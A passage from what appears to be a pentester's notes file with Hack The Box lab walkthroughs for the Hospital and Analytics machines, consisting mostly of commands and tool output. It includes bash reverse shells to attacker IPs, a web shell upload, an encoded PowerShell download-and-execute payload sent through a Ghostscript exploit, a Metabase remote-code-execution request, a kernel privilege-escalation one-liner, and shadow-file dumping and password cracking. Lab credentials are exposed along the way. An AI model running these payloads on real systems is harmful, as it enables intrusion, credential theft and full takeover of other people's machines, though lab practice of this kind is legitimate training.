| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp  open  msmq?
2103/tcp  open  msrpc             Microsoft Windows RPC
2105/tcp  open  msrpc             Microsoft Windows RPC
2107/tcp  open  msrpc             Microsoft Windows RPC
2179/tcp  open  vmrdp?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp  open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2023-12-03T05:59:28+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2023-09-05T18:39:34
|_Not valid after:  2024-03-06T18:39:34
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6404/tcp  open  msrpc             Microsoft Windows RPC
6406/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp  open  msrpc             Microsoft Windows RPC
6409/tcp  open  msrpc             Microsoft Windows RPC
6614/tcp  open  msrpc             Microsoft Windows RPC
6635/tcp  open  msrpc             Microsoft Windows RPC
8080/tcp  open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.55 (Ubuntu)
| http-title: Login
|_Requested resource was login.php
|_http-open-proxy: Proxy might be redirecting requests
9389/tcp  open  mc-nmf            .NET Message Framing
11840/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m56s, deviation: 0s, median: 6h59m55s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-12-03T05:59:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 207.71 seconds</rich_text>
      </node>
      <node name="exploit" unique_id="117" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701560390" ts_lastsave="1701609246">
        <rich_text>upload web shell

</rich_text>
        <rich_text link="webs https://github.com/flozz/p0wny-shell">https://github.com/flozz/p0wny-shell</rich_text>
        <rich_text>

visit </rich_text>
        <rich_text link="webs http://10.129.51.31:8080/uploads/shell.phar">http://10.129.51.31:8080/uploads/shell.phar</rich_text>
        <rich_text>

/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.153/9001 0&gt;&amp;1'

nc -lvnp 9001           
listening on [any] 9001 ...
connect to [10.10.14.153] from (UNKNOWN) [10.129.51.31] 6520
bash: cannot set terminal process group (951): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/html/uploads$

www-data@webserver:/var/www/html$ cat config.php 
&lt;?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?&gt;


MariaDB [hospital]&gt; select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
|  3 | test     | $2y$10$XI6IWhsTLU6f3afgr78jWeVxXUICrGVNmyog8OEqb.2/4h2U/Zt1O | 2023-12-03 06:03:28 |
+----+----------+--------------------------------------------------------------+---------------------+
3 rows in set (0.001 sec)


$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2:123456



privesc

www-data@webserver:/dev/shm$ uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

google for privesc 

</rich_text>
        <rich_text link="webs https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629</rich_text>
        <rich_text>

run it in /tmp

www-data@webserver:/tmp$ ./exploit.sh
./exploit.sh
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@webserver:/tmp#

cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:106::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:101:1::/var/cache/pollinate:/bin/false
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
syslog:x:103:109::/nonexistent:/usr/sbin/nologin
uuidd:x:104:110::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:111::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:113::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:108:114:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false

cat /etc/shadow

root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:*:19462:0:99999:7:::
bin:*:19462:0:99999:7:::
sys:*:19462:0:99999:7:::
sync:*:19462:0:99999:7:::
games:*:19462:0:99999:7:::
man:*:19462:0:99999:7:::
lp:*:19462:0:99999:7:::
mail:*:19462:0:99999:7:::
news:*:19462:0:99999:7:::
uucp:*:19462:0:99999:7:::
proxy:*:19462:0:99999:7:::
www-data:*:19462:0:99999:7:::
backup:*:19462:0:99999:7:::
list:*:19462:0:99999:7:::
irc:*:19462:0:99999:7:::
_apt:*:19462:0:99999:7:::
nobody:*:19462:0:99999:7:::
systemd-network:!*:19462::::::
systemd-timesync:!*:19462::::::
messagebus:!:19462::::::
systemd-resolve:!*:19462::::::
pollinate:!:19462::::::
sshd:!:19462::::::
syslog:!:19462::::::
uuidd:!:19462::::::
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::

unshadow passwd shadow &gt; unshadow.txt

john unshadow.txt --wordlist=rockyou.txt

qwe123!@#        (drwilliams) 

drwilliams:qwe123!@#

login to webmail

</rich_text>
        <rich_text link="webs https://hospital.htb/?_task=login">https://hospital.htb/?_task=login</rich_text>
        <rich_text>

open first email

google for exploit

GhostScript .eps exploit

</rich_text>
        <rich_text link="webs https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509">https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection">https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection</rich_text>
        <rich_text>

python3 CVE_2023_36664_exploit.py -g -p "powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEANQAzAC8AcgBlAHYALgBwAHMAMQAnACkACgA=" -x eps

nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.153] from (UNKNOWN) [10.129.50.191] 28229

PS C:\Users\drbrown.HOSPITAL\Documents&gt; whoami
hospital\drbrown

PS C:\Users\drbrown.HOSPITAL\desktop&gt; cat user.txt
ab814444c70d1ccc0dee47ddbaf489ed

PS C:\Users\drbrown.HOSPITAL\documents&gt; cat ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"


evil-winrm -i hospital.htb -u drbrown   
Enter Password: 
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents&gt;


upload shell.php to webserver

PS C:\xampp\htdocs&gt; powershell IWR -Uri </rich_text>
        <rich_text link="webs http://10.10.14.153/shell.php">http://10.10.14.153/shell.php</rich_text>
        <rich_text> -Outfile shell.php

visit </rich_text>
        <rich_text link="webs https://hospital.htb/shell.php">https://hospital.htb/shell.php</rich_text>
        <rich_text>

DC$@DC:C:\xampp\htdocs# whoami
nt authority\system

DC$@DC:C:\Users\Administrator\Desktop# type root.txt
c19b52e23237a8101d670669d926f848</rich_text>
      </node>
    </node>
    <node name="Analytics" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698402082" ts_lastsave="1698402085">
      <node name="nmap" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698402085" ts_lastsave="1698402763">
        <rich_text>sudo nmap -p- -sC -sV 10.129.128.242 -oA nmap/all -v
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-10-27 12:27 CEST
Nmap scan report for 10.129.128.242
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to </rich_text>
        <rich_text link="webs http://analytical.htb/">http://analytical.htb/</rich_text>
        <rich_text>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</rich_text>
      </node>
      <node name="buster" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698402763" ts_lastsave="1698403253">
        <rich_text>gobuster vhost -u </rich_text>
        <rich_text link="webs http://analytical.htb/">http://analytical.htb/</rich_text>
        <rich_text> -w /home/haha150/git/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             </rich_text>
        <rich_text link="webs http://analytical.htb/">http://analytical.htb/</rich_text>
        <rich_text>
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /home/haha150/git/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: data.analytical.htb Status: 200 [Size: 77858]






feroxbuster --url </rich_text>
        <rich_text link="webs http://analytical.htb/">http://analytical.htb/</rich_text>
        <rich_text> 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://analytical.htb/">http://analytical.htb/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://analytical.htb/css">http://analytical.htb/css</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://analytical.htb/css/">http://analytical.htb/css/</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://analytical.htb/images">http://analytical.htb/images</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://analytical.htb/images/">http://analytical.htb/images/</rich_text>
        <rich_text>
301      GET        7l       12w      178c </rich_text>
        <rich_text link="webs http://analytical.htb/js">http://analytical.htb/js</rich_text>
        <rich_text> =&gt; </rich_text>
        <rich_text link="webs http://analytical.htb/js/">http://analytical.htb/js/</rich_text>
        <rich_text>
200      GET        8l       58w     3302c </rich_text>
        <rich_text link="webs http://analytical.htb/images/instagram-icon-2.png">http://analytical.htb/images/instagram-icon-2.png</rich_text>
        <rich_text>
200      GET       10l       70w     3839c </rich_text>
        <rich_text link="webs http://analytical.htb/images/icon-3.png">http://analytical.htb/images/icon-3.png</rich_text>
        <rich_text>
200      GET        9l       85w     3701c </rich_text>
        <rich_text link="webs http://analytical.htb/images/icon-2.png">http://analytical.htb/images/icon-2.png</rich_text>
        <rich_text>
200      GET        8l       70w     3330c </rich_text>
        <rich_text link="webs http://analytical.htb/images/instagram-icon.png">http://analytical.htb/images/instagram-icon.png</rich_text>
        <rich_text>
200      GET        4l       45w     1538c </rich_text>
        <rich_text link="webs http://analytical.htb/images/email-icon.png">http://analytical.htb/images/email-icon.png</rich_text>
        <rich_text>
200      GET        7l       61w     2837c </rich_text>
        <rich_text link="webs http://analytical.htb/images/fb-icon.png">http://analytical.htb/images/fb-icon.png</rich_text>
        <rich_text>
200      GET        5l       47w     1720c </rich_text>
        <rich_text link="webs http://analytical.htb/images/phone-icon.png">http://analytical.htb/images/phone-icon.png</rich_text>
        <rich_text>
200      GET      370l     1201w     9645c </rich_text>
        <rich_text link="webs http://analytical.htb/js/custom.js">http://analytical.htb/js/custom.js</rich_text>
        <rich_text>
200      GET        9l       62w     2803c </rich_text>
        <rich_text link="webs http://analytical.htb/images/fb-icon-2.png">http://analytical.htb/images/fb-icon-2.png</rich_text>
        <rich_text>
200      GET        3l       43w     1102c </rich_text>
        <rich_text link="webs http://analytical.htb/images/icon.png">http://analytical.htb/images/icon.png</rich_text>
        <rich_text>
200      GET        8l       73w     3030c </rich_text>
        <rich_text link="webs http://analytical.htb/images/twitter-icon-2.png">http://analytical.htb/images/twitter-icon-2.png</rich_text>
        <rich_text>
200      GET        7l       58w     2965c </rich_text>
        <rich_text link="webs http://analytical.htb/images/twitter-icon.png">http://analytical.htb/images/twitter-icon.png</rich_text>
        <rich_text>
200      GET        5l       51w     1831c </rich_text>
        <rich_text link="webs http://analytical.htb/images/mail-icon.png">http://analytical.htb/images/mail-icon.png</rich_text>
        <rich_text>
200      GET        6l       73w     3248c </rich_text>
        <rich_text link="webs http://analytical.htb/css/owl.carousel.min.css">http://analytical.htb/css/owl.carousel.min.css</rich_text>
        <rich_text>
200      GET       14l       84w     4530c </rich_text>
        <rich_text link="webs http://analytical.htb/images/icon-4.png">http://analytical.htb/images/icon-4.png</rich_text>
        <rich_text>
200      GET        9l       68w     2462c </rich_text>
        <rich_text link="webs http://analytical.htb/images/call-icon.png">http://analytical.htb/images/call-icon.png</rich_text>
        <rich_text>
200      GET        5l       55w     1485c </rich_text>
        <rich_text link="webs http://analytical.htb/images/map-icon.png">http://analytical.htb/images/map-icon.png</rich_text>
        <rich_text>
200      GET      452l     1395w    11727c </rich_text>
        <rich_text link="webs http://analytical.htb/css/responsive.css">http://analytical.htb/css/responsive.css</rich_text>
        <rich_text>
200      GET      213l     1380w    11324c </rich_text>
        <rich_text link="webs http://analytical.htb/js/jquery-3.0.0.min.js">http://analytical.htb/js/jquery-3.0.0.min.js</rich_text>
        <rich_text>
200      GET        6l      352w    19190c </rich_text>
        <rich_text link="webs http://analytical.htb/js/popper.min.js">http://analytical.htb/js/popper.min.js</rich_text>
        <rich_text>
200      GET      817l     1328w    13877c </rich_text>
        <rich_text link="webs http://analytical.htb/css/style.css">http://analytical.htb/css/style.css</rich_text>
        <rich_text>
200      GET        7l      896w    70808c </rich_text>
        <rich_text link="webs http://analytical.htb/js/bootstrap.bundle.min.js">http://analytical.htb/js/bootstrap.bundle.min.js</rich_text>
        <rich_text>
200      GET        5l     1287w    87088c </rich_text>
        <rich_text link="webs http://analytical.htb/js/jquery.min.js">http://analytical.htb/js/jquery.min.js</rich_text>
        <rich_text>
200      GET        5l      478w    45479c </rich_text>
        <rich_text link="webs http://analytical.htb/js/jquery.mCustomScrollbar.concat.min.js">http://analytical.htb/js/jquery.mCustomScrollbar.concat.min.js</rich_text>
        <rich_text>
200      GET        1l      870w    42839c </rich_text>
        <rich_text link="webs http://analytical.htb/css/jquery.mCustomScrollbar.min.css">http://analytical.htb/css/jquery.mCustomScrollbar.min.css</rich_text>
        <rich_text>
200      GET        7l     1604w   140421c </rich_text>
        <rich_text link="webs http://analytical.htb/css/bootstrap.min.css">http://analytical.htb/css/bootstrap.min.css</rich_text>
        <rich_text>
200      GET      995l     5511w   461589c </rich_text>
        <rich_text link="webs http://analytical.htb/images/img-2.png">http://analytical.htb/images/img-2.png</rich_text>
        <rich_text>
200      GET     1225l     7999w   640669c </rich_text>
        <rich_text link="webs http://analytical.htb/images/img-1.png">http://analytical.htb/images/img-1.png</rich_text>
        <rich_text>
200      GET     1077l     6289w   516092c </rich_text>
        <rich_text link="webs http://analytical.htb/images/img-3.png">http://analytical.htb/images/img-3.png</rich_text>
        <rich_text>
200      GET     1111l     6288w   520385c </rich_text>
        <rich_text link="webs http://analytical.htb/images/img-4.png">http://analytical.htb/images/img-4.png</rich_text>
        <rich_text>
200      GET    18950l    75725w   918708c </rich_text>
        <rich_text link="webs http://analytical.htb/js/plugin.js">http://analytical.htb/js/plugin.js</rich_text>
        <rich_text>
200      GET      364l     1136w    17169c </rich_text>
        <rich_text link="webs http://analytical.htb/">http://analytical.htb/</rich_text>
        <rich_text>
[####################] - 23s   120041/120041  0s      found:35      errors:0      
[####################] - 22s    30000/30000   1364/s  </rich_text>
        <rich_text link="webs http://analytical.htb/">http://analytical.htb/</rich_text>
        <rich_text> 
[####################] - 22s    30000/30000   1379/s  </rich_text>
        <rich_text link="webs http://analytical.htb/css/">http://analytical.htb/css/</rich_text>
        <rich_text> 
[####################] - 22s    30000/30000   1383/s  </rich_text>
        <rich_text link="webs http://analytical.htb/images/">http://analytical.htb/images/</rich_text>
        <rich_text> 
[####################] - 22s    30000/30000   1373/s  </rich_text>
        <rich_text link="webs http://analytical.htb/js/">http://analytical.htb/js/</rich_text>
        <rich_text> 





</rich_text>
      </node>
      <node name="exploit" unique_id="93" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698403253" ts_lastsave="1698406174">
        <rich_text>google for exploit

metabase login exploit

</rich_text>
        <rich_text link="webs https://github.com/securezeron/CVE-2023-38646">https://github.com/securezeron/CVE-2023-38646</rich_text>
        <rich_text>

python3 CVE-2023-38646-POC.py --ip data.analytical.htb       
Failed to connect using HTTPS for data.analytical.htb. Trying next protocol...
None. Vulnerable Metabase Instance:-
             IP: data.analytical.htb
             Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f


edit CVE

bash -c 'bash -i &gt;&amp; /dev/tcp/{listener_ip}/{listener_port} 0&gt;&amp;1'".encode()).decode()


python3 CVE-2023-38646-Reverse-Shell.py --rhost </rich_text>
        <rich_text link="webs http://data.analytical.htb">http://data.analytical.htb</rich_text>
        <rich_text> --lhost 10.10.14.47
[DEBUG] Original rhost: </rich_text>
        <rich_text link="webs http://data.analytical.htb">http://data.analytical.htb</rich_text>
        <rich_text>
[DEBUG] Preprocessed rhost: </rich_text>
        <rich_text link="webs http://data.analytical.htb">http://data.analytical.htb</rich_text>
        <rich_text>
[DEBUG] Input Arguments - rhost: </rich_text>
        <rich_text link="webs http://data.analytical.htb,">http://data.analytical.htb,</rich_text>
        <rich_text> lhost: 10.10.14.47, lport: 4444
[DEBUG] Fetching setup token from </rich_text>
        <rich_text link="webs http://data.analytical.htb/api/session/properties...">http://data.analytical.htb/api/session/properties...</rich_text>
        <rich_text>
[DEBUG] Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Version: v0.46.6
[DEBUG] Setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Payload = YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ny80NDQ0IDA+JjEn
[DEBUG] Sending request to </rich_text>
        <rich_text link="webs http://data.analytical.htb/api/setup/validate">http://data.analytical.htb/api/setup/validate</rich_text>
        <rich_text> with headers {'Content-Type': 'application/json'} and data {
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details": {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules": {},
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ny80NDQ0IDA+JjEn}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "test",
        "engine": "h2"
    }
}
[DEBUG] Response received: {"message":"Error creating or initializing trigger \"PWNSHELL\" object, class \"..source..\", cause: \"org.h2.message.DbException: Syntax error in SQL statement \"\"//javascript\\\\000ajava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ny80NDQ0IDA+JjEn}|{base64,-d}|{bash,-i}')\\\\000a\"\" [42000-212]\"; see root cause for details; SQL statement:\nSET TRACE_LEVEL_SYSTEM_OUT 1 [90043-212]"}
[DEBUG] POST to </rich_text>
        <rich_text link="webs http://data.analytical.htb/api/setup/validate">http://data.analytical.htb/api/setup/validate</rich_text>
        <rich_text> failed with status code: 400



nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.47] from (UNKNOWN) [10.129.128.242] 33206
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
28b0d0025949:/$ whoami
whoami
metabase
28b0d0025949:/$ id
id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)



14e4251665be:/plugins$ env
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=14e4251665be
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/plugins
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=5
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
OLDPWD=/metabase.db



ssh metalytics@10.129.73.86
metalytics@10.129.73.86's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

Last login: Tue Oct  3 09:14:35 2023 from 10.10.14.41
metalytics@analytics:~$ whoami
metalytics
metalytics@analytics:~$ id
uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)

metalytics@analytics:~$ cat user.txt 
11a5b08786aa37579dd596fb874bfd0a

metalytics@analytics:/tmp$ unshare -rm sh -c "mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;" &amp;&amp; u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash &amp;&amp; chmod 4755 /var/tmp/bash &amp;&amp; /var/tmp/bash -p &amp;&amp; rm -rf l m u w /var/tmp/bash")'</rich_text>
      </node>
    </node>
    <node name="Zipping" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694605158" ts_lastsave="1694605160">
      <node name="nmap" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694605160" ts_lastsave="1694605419">
        <rich_text>sudo nmap -p- -sC -sV 10.129.171.190 -oA nmap/all -v
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-09-13 13:41 CEST
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-server-header: Apache/2.4.54 (Ubuntu)
|_http-title: Zipping | Watch store
| http-methods: 
